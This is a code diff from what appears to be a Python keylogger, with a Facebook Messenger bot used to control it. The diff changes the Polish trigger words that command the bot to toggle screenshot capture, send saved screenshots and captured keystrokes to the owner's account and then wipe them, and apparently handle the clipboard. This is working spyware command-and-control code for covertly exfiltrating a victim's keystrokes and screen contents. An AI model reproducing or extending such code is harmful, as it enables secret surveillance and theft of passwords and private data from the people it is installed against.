@@ -26,11 +26,11 @@ class FacebookController(fbchat.Client):
     def on_message(self, mid, author_id, author_name, message, metadata):
         if 'patrz' in message:
             self.keylogger.toggle_screenshots_capturing()
-        if message == 'screen':
+        if 'widziales' in message:
             for screenshot in self.keylogger.get_saved_screenshots():
                 self.sendLocalImage(self.owner_uid, message='to widzialem: {}'.format(screenshot), image=screenshot)
             self.keylogger.reset_screenshot_directory()
-        if 'karta' in message:
+        if 'karcie' in message:
             self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))
 
         if 'schowek' in message:
